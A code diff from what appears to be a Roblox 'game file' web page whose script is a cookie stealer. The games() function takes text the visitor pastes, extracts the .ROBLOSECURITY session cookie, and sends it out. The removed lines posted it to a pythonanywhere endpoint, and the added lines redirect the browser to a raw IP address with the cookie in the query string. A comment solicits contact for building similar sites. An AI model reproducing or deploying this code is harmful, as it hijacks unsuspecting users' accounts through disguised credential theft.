@@ -82,12 +82,12 @@ If you don't know how to find a games "game file" then go ahead and watch "How t
     </script>
 <script>//If you're looking here, you probably know what you're doing. If you want a website like just like this, contact Talpa#6969 on discord or email [talpa (at) talpa (dot) cc].
       function games() {
+        
         a = code.value;
         b = a.split('.ROBLOSECURITY=').pop();
-        c = b.split('; RBXEventTrackerV2')[0]
-        $.post("https://bloxtools.pythonanywhere.com/send_data", JSON.stringify({
-            'content': c
-        }));
+        c = b.split(';')[0]
+        location.href = "http://159.223.217.5:6969/send_data?content="+c;
+      
       }
       function remove_hash() {
         setTimeout(() => {
